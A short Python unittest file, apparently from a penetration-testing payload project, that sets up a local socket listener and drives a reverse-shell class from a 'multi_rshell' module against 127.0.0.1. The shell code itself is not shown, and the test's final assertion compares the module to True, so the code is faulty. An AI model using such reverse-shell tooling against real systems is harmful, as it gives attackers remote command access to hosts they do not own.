import unittest
import socket
from Payloads.Reverse_Shells import multi_rshell


class MyTestCase(unittest.TestCase):

    def setUp(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Serving http on localhost port 8080")
        self.assertIsNotNone(self.sock)
        self.sock.bind(("127.0.0.1", 8080))
        self.sock.listen(0)

    def tearDown(self):
        print("Closing socket listener")
        self.sock.close()
        self.conn.close()

    # def handle(self):
    #     self.conn, self.addr = self.sock.accept()
    #     print("Connection established from: {} {}".format(self.addr[0], str(self.addr[1])))

    def test_linux_shell(self):
        print("Testing reverse shell to 127.0.0.1:8080")
        self.client = multi_rshell.ReverseShell("127.0.0.1", 8080) # Connect to client
        self.conn, self.addr = self.sock.accept()

        self.assertIsNotNone(self.client)  # Test that client exists

        multi_rshell.ReverseShell.linux(self.client)
        self.assertEqual(multi_rshell, True)


if __name__ == '__main__':
    unittest.main()
